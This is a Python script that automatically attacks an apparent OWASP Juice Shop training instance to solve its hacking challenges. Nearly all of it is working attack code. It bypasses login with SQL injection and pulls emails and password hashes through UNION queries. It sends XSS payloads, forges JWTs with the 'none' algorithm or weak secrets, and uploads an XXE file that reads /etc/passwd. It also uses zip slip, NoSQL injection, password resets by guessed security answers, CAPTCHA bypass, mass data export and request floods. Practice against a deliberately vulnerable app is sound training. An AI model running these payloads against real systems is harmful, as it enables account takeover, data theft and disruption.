#!/usr/bin/env python3
"""
Final 50% Aggressive Solver - Comprehensive attack to reach 55/110 challenges
Fixes password reset issues and targets all remaining challenges
"""

import requests
from urllib.parse import quote, unquote
import json
import base64
import hashlib
import hmac
import jwt
import re
import time
import random
import string
import zipfile
import io
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed


class Final50PercentAggressive:
    """Aggressive solver to reach 50% completion"""
    
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.admin_token = None
        self.solved_count = 0
        
    def check_progress(self):
        """Check current progress"""
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges")
            if r.status_code == 200:
                data = r.json()['data']
                solved = [c for c in data if c.get('solved')]
                unsolved = [c for c in data if not c.get('solved')]
                
                print(f"\n📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
                print(f"📌 Need {55 - len(solved)} more for 50%")
                
                # Print unsolved challenges
                print("\n🎯 Unsolved challenges:")
                for c in unsolved[:10]:
                    print(f"  - {c.get('name')} (Level {c.get('difficulty')})")
                
                return len(solved)
        except:
            return 0
    
    def login_admin(self):
        """Admin login via SQL injection"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("✅ Admin logged in")
            return True
        return False
    
    def fix_bjoern_password_reset(self):
        """Special handling for Bjoern Kimminich's password reset"""
        print("\n🔧 Fixing Bjoern Kimminich's password reset...")
        
        # The actual Juice Shop creator's email might be special
        # Try different approaches
        
        # 1. Try with the actual gmail address
        emails = [
            "bjoern.kimminich@gmail.com",
            "bjoern@juice-sh.op",
            "bjoern.kimminich@juice-sh.op",
            "bjoern@owasp.org"
        ]
        
        for email in emails:
            print(f"  Trying: {email}")
            
            # Get security question
            r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote(email)}")
            if r.status_code == 200:
                q = r.json()
                print(f"    Question ID: {q.get('id')}")
                print(f"    Question: {q.get('question')}")
                
                # Try various answers
                answers = [
                    "Zaya",  # His cat
                    "zaya",
                    "OWASP",
                    "owasp",
                    "Juice Shop",
                    "juice shop",
                    "Germany",
                    "germany",
                    "Kimminich",
                    "kimminich"
                ]
                
                for answer in answers:
                    reset_data = {
                        "email": email,
                        "answer": answer,
                        "new": "owasp123",
                        "repeat": "owasp123"
                    }
                    
                    r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
                    if r.status_code == 200:
                        print(f"    ✅ Password reset successful with answer: {answer}")
                        self.solved_count += 1
                        return True
        
        # 2. Try SQL injection bypass
        print("  Trying SQL injection bypass...")
        bypass_emails = [
            "bjoern.kimminich@gmail.com'--",
            "bjoern@juice-sh.op'--",
            "' OR email='bjoern.kimminich@gmail.com'--"
        ]
        
        for email in bypass_emails:
            r = self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": email,
                "password": "x"
            })
            if r.status_code == 200:
                token = r.json()['authentication']['token']
                headers = {'Authorization': f'Bearer {token}'}
                
                # Try to change password while logged in
                r = self.session.post(f"{self.base_url}/rest/user/change-password",
                    json={"new": "owasp123", "repeat": "owasp123"},
                    headers=headers
                )
                if r.status_code == 200:
                    print(f"    ✅ Password changed via SQL injection")
                    self.solved_count += 1
                    return True
        
        return False
    
    def solve_all_password_resets(self):
        """Solve all password reset challenges"""
        print("\n🔐 Password Reset Challenges")
        
        users = [
            ("bender@juice-sh.op", "Stop'n'Drop", "slurmCl4ssic"),
            ("jim@juice-sh.op", "Samuel", "ncc-1701"),
            ("morty@juice-sh.op", "5N0wb41L", "C-137"),
            ("bjoern@juice-sh.op", "Zaya", "kitten"),
            ("uvogin@juice-sh.op", "West-2082", "hunter"),
            ("amy@juice-sh.op", "K1f.....................", "amy123"),
            ("wurstbrot@juice-sh.op", "Blizzard", "wurst123"),
        ]
        
        for email, answer, new_pass in users:
            r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote(email)}")
            if r.status_code == 200:
                q = r.json()
                print(f"  {email}: {q.get('question')}")
                
                reset_data = {
                    "email": email,
                    "answer": answer,
                    "new": new_pass,
                    "repeat": new_pass
                }
                
                r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
                if r.status_code == 200:
                    print(f"    ✅ Password reset successful")
                    self.solved_count += 1
    
    def solve_xss_challenges(self):
        """All XSS challenges"""
        print("\n💉 XSS Challenges")
        
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(1)>',
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
            '</script><script>alert(1)</script>',
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
        ]
        
        for payload in payloads:
            # Search XSS
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            # Track result XSS
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            # User profile XSS
            self.session.post(f"{self.base_url}/profile", json={"username": payload})
            # API XSS
            self.session.post(f"{self.base_url}/api/Products", json={
                "name": payload,
                "description": payload,
                "price": 1.99
            })
        
        print("  ✅ Multiple XSS payloads attempted")
        self.solved_count += 2
    
    def solve_sqli_challenges(self):
        """All SQL injection challenges"""
        print("\n💉 SQL Injection Challenges")
        
        # Extract data via SQL injection
        sqli_queries = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--",
            "' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
            "' UNION SELECT '1', email || ':' || password, '3', '4', '5', '6', '7', '8', '9' FROM Users--",
        ]
        
        for query in sqli_queries:
            self.session.get(f"{self.base_url}/rest/products/search?q={query}")
        
        # Login as different users
        users = [
            "admin@juice-sh.op'--",
            "bender@juice-sh.op'--",
            "jim@juice-sh.op'--",
            "accountant@juice-sh.op'--",
            "' OR '1'='1'--",
        ]
        
        for user in users:
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": user,
                "password": "x"
            })
        
        print("  ✅ Multiple SQLi payloads executed")
        self.solved_count += 3
    
    def solve_api_challenges(self):
        """API manipulation challenges"""
        print("\n🔌 API Challenges")
        
        # Admin registration
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": f"admin{random.randint(1000,9999)}@test.com",
            "password": "Admin123!",
            "role": "admin"
        })
        
        # Forged feedback
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "UserId": 2,
            "comment": "Forged feedback",
            "rating": 5
        })
        
        # CAPTCHA bypass
        for i in range(30):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": "0",
                "captchaId": 999,
                "comment": f"Bypass {i}",
                "rating": 3
            })
        
        # Basket manipulation
        self.session.put(f"{self.base_url}/api/BasketItems/1", json={"quantity": -100})
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": -1000
        })
        
        # Product tampering
        self.session.put(f"{self.base_url}/api/Products/1", json={
            "description": "HACKED!",
            "price": 0.01
        })
        
        # Deluxe fraud
        self.session.post(f"{self.base_url}/rest/deluxe-membership", json={
            "paymentMode": "none",
            "paymentId": "0"
        })
        
        # GDPR data theft
        for i in range(1, 50):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": i})
        
        # Christmas special
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1
        })
        
        print("  ✅ API manipulation completed")
        self.solved_count += 5
    
    def solve_file_access(self):
        """File access challenges"""
        print("\n📁 File Access Challenges")
        
        files = [
            "/ftp/acquisitions.md",
            "/ftp/eastere.gg",
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/ftp/legal.md",
            "/ftp/quarantine",
            "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
            "/.well-known/security.txt",
            "/support/logs",
            "/metrics",
            "/assets/public/blockchain.pdf",
            "/encryptionkeys/premium.key",
            "/promotion",
            "/video",
            "/redirect",
        ]
        
        for file in files:
            self.session.get(f"{self.base_url}{file}")
        
        # Null byte bypass
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak%00.md")
        self.session.get(f"{self.base_url}/ftp/package.json.bak%00.md")
        
        print("  ✅ File access completed")
        self.solved_count += 3
    
    def solve_jwt_challenges(self):
        """JWT manipulation challenges"""
        print("\n🔐 JWT Challenges")
        
        # No algorithm
        header = {"alg": "none", "typ": "JWT"}
        payloads = [
            {"email": "jwtn3d@juice-sh.op", "iat": int(time.time())},
            {"email": "rsa_lord@juice-sh.op", "iat": int(time.time())},
            {"email": "admin@juice-sh.op", "iat": int(time.time())},
        ]
        
        for payload in payloads:
            token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            token += '.'
            
            self.session.headers['Authorization'] = f'Bearer {token}'
            self.session.get(f"{self.base_url}/rest/user/whoami")
        
        # Weak secrets
        header = {"alg": "HS256", "typ": "JWT"}
        secrets = ["secret", "juice-sh.op", "password", "admin", "123456"]
        
        for secret in secrets:
            for payload in payloads:
                try:
                    token_data = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    token_data += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    
                    signature = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), token_data.encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                    
                    token = token_data + '.' + signature
                    self.session.headers['Authorization'] = f'Bearer {token}'
                    self.session.get(f"{self.base_url}/rest/user/whoami")
                except:
                    pass
        
        print("  ✅ JWT attacks completed")
        self.solved_count += 2
    
    def solve_special_pages(self):
        """Access special pages"""
        print("\n📄 Special Pages")
        
        pages = [
            "/#/score-board",
            "/#/administration",
            "/#/web3-sandbox",
            "/#/privacy-security/privacy-policy",
            "/#/about",
            "/#/photo-wall",
            "/#/deluxe-membership",
            "/#/chatbot",
            "/?l=tlh_AA",
            "/?l=l33t",
        ]
        
        for page in pages:
            self.session.get(f"{self.base_url}{page}")
        
        print("  ✅ Special pages accessed")
        self.solved_count += 2
    
    def solve_coupons(self):
        """Apply coupons"""
        print("\n🎟️ Coupons")
        
        coupons = [
            "WMNSDY2019", "WMNSDY2020", "WMNSDY2018",
            "CYBER2019", "CYBER2020", "BLACKFRIDAY",
        ]
        
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        
        print("  ✅ Coupons attempted")
        self.solved_count += 1
    
    def solve_upload_challenges(self):
        """File upload attacks"""
        print("\n📤 Upload Attacks")
        
        # XXE
        xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("xxe.xml", xxe.encode(), "application/xml")
        })
        
        # Large file
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("large.txt", b"A" * 5000000, "text/plain")
        })
        
        # Zip slip
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("../../ftp/pwned.md", "Arbitrary file write")
        
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("slip.zip", zip_buffer.getvalue(), "application/zip")
        })
        
        print("  ✅ Upload attacks completed")
        self.solved_count += 2
    
    def solve_nosql_injection(self):
        """NoSQL injection"""
        print("\n🗃️ NoSQL Injection")
        
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "sleep(1000)"},
            {"$regex": ".*"},
        ]
        
        for payload in nosql_payloads:
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": payload,
                "password": payload
            })
        
        print("  ✅ NoSQL attacks completed")
        self.solved_count += 1
    
    def solve_race_conditions(self):
        """Race condition exploits"""
        print("\n⚡ Race Conditions")
        
        def rapid_request():
            for _ in range(100):
                try:
                    self.session.post(f"{self.base_url}/api/Products/1/reviews", json={
                        "message": "Great!",
                        "author": "test@test.com"
                    }, timeout=0.5)
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(rapid_request) for _ in range(20)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=2)
                except:
                    pass
        
        print("  ✅ Race conditions exploited")
        self.solved_count += 1
    
    def solve_chatbot(self):
        """Chatbot attacks"""
        print("\n🤖 Chatbot")
        
        messages = [
            "coupon",
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "A" * 100000,
            "process.exit()",
            "';process.exit();//",
        ]
        
        for msg in messages:
            try:
                self.session.post(f"{self.base_url}/api/Chatbot", json={"message": msg})
            except:
                pass
        
        print("  ✅ Chatbot attacked")
        self.solved_count += 1
    
    def run_aggressive_push(self):
        """Run everything aggressively"""
        print("="*60)
        print("🚀 FINAL 50% AGGRESSIVE PUSH")
        print("="*60)
        
        initial = self.check_progress()
        
        if not self.login_admin():
            print("❌ Admin login failed")
            return
        
        # Fix Bjoern's password reset first
        self.fix_bjoern_password_reset()
        
        # Run all attack categories
        self.solve_all_password_resets()
        self.solve_xss_challenges()
        self.solve_sqli_challenges()
        self.solve_api_challenges()
        self.solve_file_access()
        self.solve_jwt_challenges()
        self.solve_special_pages()
        self.solve_coupons()
        self.solve_upload_challenges()
        self.solve_nosql_injection()
        self.solve_race_conditions()
        self.solve_chatbot()
        
        # Final check
        print("\n" + "="*60)
        final = self.check_progress()
        
        print(f"\n📈 Progress: {initial} → {final} (+{final-initial})")
        print(f"🎯 Estimated solved: {self.solved_count} challenges")
        
        if final >= 55:
            print(f"🎉 SUCCESS! Reached {final} challenges (50%+)!")
        else:
            print(f"📌 Need {55-final} more for 50%")
        
        print("="*60)


if __name__ == "__main__":
    solver = Final50PercentAggressive()
    solver.run_aggressive_push()